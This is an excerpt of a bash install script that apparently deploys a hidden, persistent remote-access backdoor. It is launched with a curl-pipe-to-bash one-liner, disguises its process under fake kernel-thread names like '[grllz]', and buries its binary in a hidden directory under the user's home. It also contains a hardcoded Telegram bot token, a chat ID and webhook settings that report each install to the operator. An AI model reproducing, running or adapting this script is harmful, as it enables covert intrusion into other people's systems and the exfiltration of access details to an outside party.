...
#
# See [URL REMOVED] for examples.
#
# This script is typically invoked like this as root or non-root user:
#   $ bash -c "$(curl -fsSL [URL REMOVED]
#
# Connect
#   $ S=MySecret bash -c "$(curl -fsSL [URL REMOVED]
# Pre-set a secret:
#   $ X=MySecret bash -c "$(curl -fsSL [URL REMOVED]
# Uninstall
#   $ GS_UNDO=1 bash -c" $(curl -fsSL [URL REMOVED]
#
# Other variables:
# GS_DEBUG=1
#		- Verbose output
...
# GS_URL_BASE=[URL REMOVED]
#		- Specify URL of static binaries
# GS_URL_BIN=
#		- Specify URL of static binaries, defaults to [URL REMOVED]
...
# GS_WEBHOOK_KEY=
#       - [URL REMOVED] key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
# GS_WEBHOOK=
#       - Generic webhook, ="[URL REMOVED]
# GS_HOST=
...
# Global Defines
URL_BASE_CDN="[URL REMOVED]
URL_BASE_X="[URL REMOVED]
[[ -n $GS_URL_BASE ]] && {
...
### Telegram
GS_TG_TOKEN="7890655250:AAFi2NAyL1IDdtxB7dTShcoHwcJ_Qrrr9Z8"
GS_TG_CHATID="6649517071"
[[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "[URL REMOVED]
	GS_WEBHOOK_WGET=("[URL REMOVED]
}
...
[[ -n $GS_WEBHOOK_KEY ]] && {
	...
	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "[URL REMOVED]
	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "[URL REMOVED]
}
### discord webhook
...
BIN_HIDDEN_NAME_DEFAULT="GrllzYolo"
# Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
proc_name_arr=("[grllz]" "[gorillaz]" "[2d]" "[noodle]" "[murdoc]" "[russel]" "[damon]" "[albarn]" "[1227grllz]" "[Gorillz]" "[YohoGorillaz]" "[YoloGorillaz]")
...
init_dstbin()
{
	...
	[[ ! -d "${GS_PREFIX}${HOME}/../1227" ]] && xmkdir "${GS_PREFIX}${HOME}/../1227"
	try_dstdir "${GS_PREFIX}${HOME}/../1227/${CONFIG_DIR_NAME}" && return
...
uninstall()
{
	...
	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
			uninstall_rm "${GS_PREFIX}${HOME}/../1227/${cn}/${hn}"
			uninstall_rm "${GS_PREFIX}${HOME}/../1227/${cn}/${hn}.dat"  # SEC_NAME
		done
	...
	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
		uninstall_rmdir "${GS_PREFIX}${HOME}/../1227/${cn}"
	done
	uninstall_rmdir "${GS_PREFIX}${HOME}/../1227"
...
init_setup
# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL [URL REMOVED]
[[ -n "$X" ]] && GS_SECRET_X="$X"
...
echo -e "--> ${CW}Join us on Telegram - [URL REMOVED]
